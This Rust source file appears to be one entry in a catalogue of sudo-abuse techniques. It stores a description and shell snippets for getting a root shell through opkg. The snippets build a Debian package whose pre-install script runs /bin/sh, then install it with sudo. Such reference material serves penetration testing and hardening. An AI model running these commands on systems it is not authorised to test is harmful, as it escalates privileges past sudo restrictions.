pub static BIN_NAME: &'static str = "opkg";
pub static SUDO_DESC_1: &'static str = "It runs an interactive shell using a specially crafted Debian package. Generate it with `fpm` and upload it to the target.";
pub static SUDO_CODE_1: &'static str = r#"
    
    TF=$(mktemp -d)
    echo 'exec /bin/sh' > $TF/x.sh
    fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF
"#;
pub static SUDO_CODE_2: &'static str = r#"
    
    sudo opkg install x_1.0_all.deb
"#;
use crate::code::{Code, Tag};
pub static SUDO_1: Code<'static> = Code {
    title: "SUDO_CODE_1",
    code: SUDO_CODE_1,
    tag: Tag::SUDO,
};
pub static SUDO_2: Code<'static> = Code {
    title: "SUDO_CODE_2",
    code: SUDO_CODE_2,
    tag: Tag::SUDO,
};
